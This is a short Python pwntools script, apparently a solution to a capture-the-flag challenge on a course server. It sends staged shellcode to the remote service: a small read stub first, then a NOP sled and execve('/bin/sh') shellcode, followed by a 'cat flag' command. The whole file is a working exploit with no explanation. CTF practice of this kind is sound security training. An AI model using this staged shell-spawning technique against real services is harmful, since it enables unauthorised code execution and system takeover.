from pwn import *

context.arch = 'amd64'
#/bin/sh
#2F 62 69 6E 2F 73 68 00
r = remote("csie.ctf.tw",10122)

a = asm("""
		mov rdx, rdi
		xor rdi, rdi
		syscall
	""")

l = len(a)
r.send(a)
a = asm("""
		mov rdi, 0x0068732F6E69622F
		push rdi
		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		mov rax, 0x3b
		syscall
	""")

a = l*b'\x90'+a
r.send(a)
r.send("cat flag\n")
print(r.recv())
